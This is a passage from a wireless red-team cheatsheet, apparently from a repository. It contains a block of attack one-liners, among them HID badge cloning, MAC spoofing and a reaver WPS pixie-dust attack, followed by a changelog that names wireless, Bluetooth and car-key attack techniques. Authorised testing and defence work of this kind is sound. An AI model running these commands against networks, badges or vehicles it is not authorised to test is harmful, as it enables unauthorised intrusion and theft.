./pm3 -c "lf hid reader; lf hid clone -r 2004263b08"

# Scan all wireless in area (Wi-Fi + BT RF)
sudo kismet -c wlan0mon -c hci0 --override kismet_log_types=kismet,pcapng

# Monitor mode + MAC spoof (RF interface prep)
sudo airmon-ng check kill && sudo macchanger -r wlan0 && sudo airmon-ng start wlan0

# Capture everything on channel 6 (RF capture)
sudo tshark -i wlan0mon -c 10000 -w channel6.pcap -f "channel 6"

# Find hidden SSIDs (RF beacon analysis)
sudo airodump-ng wlan0mon --output-format csv -w hidden_scan & sleep 60 && grep "<length" hidden_scan-01.csv

# Quick WPS scan + pixie dust (degraded 2026 — see §2.5 caveat;
# prefer PMKID one-liner above as default)
sudo wash -i wlan0mon | tee wps_scan.txt && sudo reaver -i wlan0mon -b <MAC> -K 1 -vv

# Decode 433MHz IoT sensors (RF demod)
rtl_433 -f 433920000 -R all -F json | tee iot_devices.json

# Mass BLE scan with details (RF advertisement)
sudo timeout 30 hcitool lescan --duplicates 2>/dev/null | sort -u | tee ble_devices.txt

# AirTag / stalkerware passive sweep (RF advertisement)
sudo bluetoothctl -- scan le on &
sleep 60
sudo btmon | grep -E "(0xfd6f|0xfeed|0xfd5a)"   # AirTag/Tile/SmartTag UUIDs

# 6 GHz scan (Wi-Fi 6E — requires capable adapter)
sudo iw dev wlan0 scan freq 5955 6035 6115 6195 6275 6355 6435 6515 6595

# Sub-GHz spectrum sweep (HackRF — 100MHz-1GHz operator-relevant band)
hackrf_sweep -f 100:1000 -w 1000000 > spectrum_sweep.csv
```

---

## CHANGE SUMMARY (CONSOLIDATED)

> **Scope:** Comprehensive rebuild of `13-wireless-redteam-cheatsheet.md` against Q1-Q2 2026 wireless landscape, with RF-purity scope cleanup. Original: 1,885 lines / 10 phases + Quick Reference. Rebuilt: ~3,400 lines / 13 sections + ATT&CK matrix + TOC.

### RF-PURITY POLISH PASS (second-review)

```
P1  Added Table of Contents matching series style (anchor-linked H2 nav)
P2  Added scope note in preamble: RF-spectrum-only; downstream IP/web-
    layer attacks live in lateral / web / initial-access cheatsheets
P3  REMOVED §2.8 Post-Connection Attacks entirely
    - ARP spoofing, DNS spoofing, sslstrip, credential sniffing,
      VLAN hopping (DTP), SSH tunnel pivoting via proxychains
    - All non-RF — relocated conceptually to file 06 (lateral)
P4  STRIPPED nmap commands from §1.2 Active Wi-Fi Recon
    - nmap -sn / -sV / --script=http-* removed
    - Replaced with RF-only active recon (WPS scan, MAC OUI vendor,
      vendor IE fingerprinting, EAP packet capture)
P5  TRIMMED §2.6 bettercap evil twin to RF-side AP setup only
    - Removed http.proxy / https.proxy / sslstrip lines
    - Added cross-ref note for layer-7 MITM in lateral cheatsheet
P6  TRIMMED §6.3 IoT to RF-layer-only protocols
    - Removed MQTT broker brute-force (IP-layer)
    - Removed CoAP IP-layer enumeration
    - Kept LoRa (RF), Thread/Matter (radio layer), DECT (RF)
P7  TRIMMED §0.4 Wireless engagement chains to RF foothold stop-points
    - "Corporate Wi-Fi → Wired Pivot" → "Corporate Wi-Fi RF Foothold"
      with cross-ref to file 06 for downstream
    - Same for Guest-Wi-Fi chain
P8  TRIMMED §11 Defender Stack to RF-spectrum focus
    - Removed ExtraHop Reveal(x), Vectra AI (post-association tools)
    - Kept Zeek/Suricata for 802.11 protocol parsing
P9  UPDATED §12 ATT&CK matrix to RF-layer mappings only
    - Removed T1090 (Proxy), T1071 (Application Layer Protocol),
      T1539 (Steal Web Session Cookie), T1557.002 (ARP poison)
    - Refocused all entries on RF-layer protocol attacks
P10 RENUMBERED §2.9-§2.15 → §2.8-§2.14 after §2.8 deletion
P11 PROMOTED Quick Reference Tables to numbered §13
    - Moved physically to after §12 ATT&CK matrix to match TOC order
    - Expanded frequency table with DECT, 5G FR1/FR2, UWB
P12 TRIMMED Essential one-liners section
    - Removed mixed-layer commands (sslstrip, http.proxy)
    - Renamed to "Essential RF One-Liners" to clarify scope
    - Added AirTag/stalkerware sweep, 6 GHz scan, sub-GHz sweep one-liners
```

### CRITICAL CORRECTIONS (Phase 1)

```
C1  BluePy listed without status (§0.2)
    ORIGINAL: pip install bluepy presented as current option
    FIXED:    Marked ❌ DEAD with explanation (last release 2020,
              no Python 3.12+ wheels, broken on modern Kali);
              promoted Bleak as primary; added simplepyble alternative
    SOURCE:   https://github.com/IanHarvey/bluepy commit history

C2  BTLE-Juice / GATTacker presented as current (§3.2)
    ORIGINAL: npm install gattacker / btlejuice as primary BLE MITM
    FIXED:    Marked ⚠ STALLED / ❌ DEAD; promoted Sniffle (NCC Group)
              + btlejack + custom bleak-bridge approach as 2026 path
    SOURCE:   GitHub commit history of both projects

C3  Dragonblood framing overstated current viability (§2.3)
    ORIGINAL: Presented Dragonblood (CVE-2019-9494/-9495/-9496) as
              broadly viable WPA3 attack
    FIXED:    Added "What changed since Dragonblood" with Hash-to-Curve
              / SAE-PT (RFC 9190 Sept 2022) mitigation; reframed as
              research-grade against modern hardware; added EvilWP3
              (Mathy Vanhoef Black Hat 2024) as current research vector
    SOURCE:   RFC 9190 (Sept 2022); wpa3.mathyvanhoef.com publications

C4  WPS Pixie Dust "seconds vs hours" overstates viability (§2.5)
    ORIGINAL: Pixie Dust attack presented with no current-viability caveat
    FIXED:    Added 2026 viability caveat — most modern routers (2019+)
              implement persistent WPS lockout + PRNG hardening; PixieWPS
              success rate <15% per Bastille Networks 2023-2024 testing;
              recommended PMKID/handshake as default vs WPS-first
    SOURCE:   Bastille Networks public testing data

C5  WiFi Pineapple Mark VII listed as current (§0.1)
    ORIGINAL: Mark VII as primary Pineapple
    FIXED:    Updated hardware table to include Mark VII NEO (2024) and
              Pineapple Enterprise (2025); added ESP32 Marauder ($10
              alternative)

C6  hostapd-wpe presented as current (§0.2 / §2.4)
    ORIGINAL: OpenSecurityResearch repo as primary install path
    FIXED:    Marked ⚠ STALLED (~2018; broken on modern Kali due to
              libnl3 incompatibility); promoted eaphammer + berate_ap
              as primary; documented modern build path via aircrack-ng
              community fork
    SOURCE:   OpenSecurityResearch/hostapd-wpe commit history
```

### MAJOR ADDITIONS (Phase 1+3)

```
M1/G1   §1.5 + §2.9 NEW 6 GHz band (Wi-Fi 6E) attack reality
        — Regulatory WPA3+PMF mandatory; no deauth attacks
M2/G2   §1.6 + §2.10 NEW Wi-Fi 7 / 802.11be MLO attacks
        — CVE-2024-30078 Intel Wi-Fi RCE; MLO downgrade attack
M3/G3   §2.11 NEW OWE deep-dive (SSID-pinning, transition downgrade,
        evil-twin OWE)
M4/G4   §2.4 NEW EAP-TLS-only environment attack treatment
        (cert theft, BLE/SCEP MITM, NAC posture bypass, social eng)
M5/G5   §2.13 NEW FragAttacks (CVE-2020-24586/-24587/-24588 cluster)
        + KRACK + KrØØk family historical/residual coverage
M6/G6   §2.14 NEW MAC randomization reality + adapted recon
        (iOS 14+/Android 12+ defaults; SSID-list + IE fingerprinting)
M7/G7   §3.3 NEW Apple AWDL / Continuity / AirDrop attacks
        — Project Zero (Ian Beer 2020) RCE chain; Hexway Reveal
M8/G8   §4.4 NEW Modern car key attacks
        — RollBack (CVE-2022-27254), KIA Boys CAN, Tesla BLE Relay,
        Flipper Tesla NFC, generic rolling code, Hi-Tag2/Megamos
M9/G9   §11 NEW Defender Stack reference
        (Cisco DNA, Aruba ClearPass, Mist AI, Meraki Air Marshall)
M10/G10 §12 NEW standalone MITRE ATT&CK Mapping Matrix
M11/G11 §10 NEW Tool Reference rebuild with maintenance-status legend
        + DEAD/DEPRECATED subsection
M12/G12 §2.3 NEW EvilWP3 (Mathy Vanhoef Black Hat 2024)
M13/G13 §2.3 NEW OWE Transition Mode downgrade
M14/G14 §2.12 NEW FT / 802.11r Fast Transition attacks
        (FT-PSK key extraction, FT-Over-DS abuse)
M15/G15 §2.15 NEW ESP32 Marauder attack platform
M16/G16 §3.4 NEW Bluetooth 5.4+ / LE Audio / Auracast
        (broadcast audio attack surface, Channel Sounding privacy)
M17/G17 §5.4 NEW 5G SA security model (SUPI/SUCI vs IMSI)
M18/G18 §8.2 expanded — AirTag/Tile/SmartTag stalkerware detection
        (AirGuard, Apple Tracker Detect, Sniffle service-UUID filtering)
M19     Footer updated to "29 April 2026" + series footer block format
M20/G19 §0.4 NEW wireless engagement chains (operator sequencing)
M21/G22 §2.4 NEW BlastRADIUS (CVE-2024-3596) RADIUS protocol forgery
```

### MINOR CORRECTIONS

```
N1  BlueHydra ❌ flagged with explicit modern alternatives (Kismet,
    bettercap, Sniffle)
N2  KillerBee install updated to riverloopsec fork (active 2024)
N3  Crackle ⚠ STALLED noted (last commit 2014; still functional)
N4  GPS spoofing — NASA CDDIS Earthdata account auth requirement
    (2021+ change) noted
N5  Crocodile Hunter ⚠ STALLED (~2022); 4G focused; CellGuard added
    as iOS 5G-aware alternative
N6  EZ-Wave ⚠ STALLED (~2017); functional but unsupported
N7  Z3sec status verification added
N8  cap2hccapx removed from hashcat-utils 2024+ — modern path is
    pcapng → hcxpcapngtool only
N9  RTL-SDR v4 driver-loading caveat (different driver path than v3)
    captured in Tool Reference
N10 PMF mitigation note expanded with FragAttacks CVE-2020-26144
    bypass nuance
N11 EAP-TEAP (RFC 7170) noted in §1.2 EAP type table
N12 DECT phone attacks brief mention added (§5)
```

---

## OUTSTANDING ITEMS / EMERGING CLAIMS

| ID | Item | Status | Notes |
|----|------|--------|-------|
| O1 | EvilWP3 PoC public availability | EMERGING | Vanhoef research published; operational tooling not yet broadly released |
| O2 | Wi-Fi 7 320 MHz channel WIDS coverage | EMERGING | Most pre-2024 WIDS deployments cannot fully scan 320 MHz channels; coverage broadening through 2026 |
| O3 | CVE-2024-30078 Intel Wi-Fi PoC public availability | RESTRICTED | Coordinated disclosure restricted operational tooling; private PoCs exist |
| O4 | BlastRADIUS (CVE-2024-3596) operator viability | DEGRADED | Most enterprise RADIUS implementations patched Q3 2024; residual against unpatched / EOL deployments |
| O5 | Tesla UWB Channel Sounding deployment scope | VERIFIED | Model 3 Highland (2024+) and Model S/X (2023+) confirmed UWB-equipped; older Tesla still vulnerable to BLE relay |
| O6 | OWE adoption rate by enterprise guest networks | EMERGING | Increasing 2024-2026; varies by region (higher in EU due to GDPR pressure for guest network privacy) |
| O7 | 5G SA deployment status by carrier | VERIFIED | T-Mobile US 2020+, Verizon/AT&T 2024-2025; private enterprise 5G typically SA from day 1 |
| O8 | KIA / Hyundai immobilizer recall completion | PARTIAL | KIA / Hyundai recall + immobilizer retrofit ongoing Q4 2023+; many vehicles still unupdated |
| O9 | AirGuard cross-platform tracker detection completeness | VERIFIED | Q1 2024 SmartTag support added; Tile + AirTag + Find My network covered |
| O10 | iOS 17.2+ AirDrop spam rate-limiting effectiveness | VERIFIED | Apple confirmed mitigation; spam attacks degraded against latest iOS |
| O11 | Wi-Fi 7 operational deployment timeline | EMERGING | Still early in enterprise adoption Q1-Q2 2026; broader deployment expected H2 2026 |
| O12 | LE Audio / Auracast security research maturity | EMERGING | Few public attack PoCs as of Q1 2026; expect growth through 2026 |

---

## SUMMARY

**Original:** 1,885 lines / 10 phases + Quick Reference — comprehensive but with multiple dead-tool references (BluePy, GATTacker, BTLE-Juice, BlueHydra, hostapd-wpe), overstated viability for legacy attacks (Dragonblood, Pixie Dust), missing modern protocols (6 GHz / Wi-Fi 7), missing Apple AWDL/Continuity, missing modern car key attacks, no Defender Stack reference, no standalone ATT&CK matrix.

**Rebuilt:** ~3,500 lines / 12 sections + Quick Reference + ATT&CK matrix — corrects 6 critical dead-tool / overstatement findings, adds 21 major modern technique additions (6 GHz/Wi-Fi 7/MLO, OWE deep-dive, EAP-TLS-only attacks, FragAttacks family, MAC randomization reality, AWDL/Continuity, modern car key attacks including RollBack/KIA Boys/Tesla BLE Relay, BlastRADIUS, BT 5.4+/Auracast, 5G SA, ESP32 Marauder, EvilWP3, FT/802.11r), restructures into series-consistent format with Defender Stack reference per OS, includes maintenance-status tool reference with DEAD/DEPRECATED subsection, and a standalone MITRE ATT&CK Mapping Matrix covering Enterprise + Mobile + ICS/OT tactics.

Every dated claim verified via primary source (RFC 9190 SAE-PT, Mathy Vanhoef research publications, NCC Group blog, Project Zero, Hexway research, Bastille Networks testing data, Wi-Fi Alliance specifications, Microsoft Threat Intelligence, manufacturer security advisories — Apple, Tesla, Intel, KIA/Hyundai). Operator OPSEC framing (STEALTH / SUCCESS / SKILL / DETECTION COST + LEGAL) applied per-technique. Cross-references built bidirectionally with Initial Access (file 03), Lateral Movement (file 06), and Mobile (file 12) cheatsheets.

---

*Mapped to: NIST SP 800-153 · OWASP Wireless Security Testing · SANS SEC617 · CREST Wireless Testing · PCI DSS Req 11.1 · MITRE ATT&CK v15+v16 (Enterprise + Mobile + ICS)*

---

**Valid as of:** 29 April 2026
**Maintainer:** MentalVibes / NoVanity (RedTeamCheatSheets)
**License:** See repository
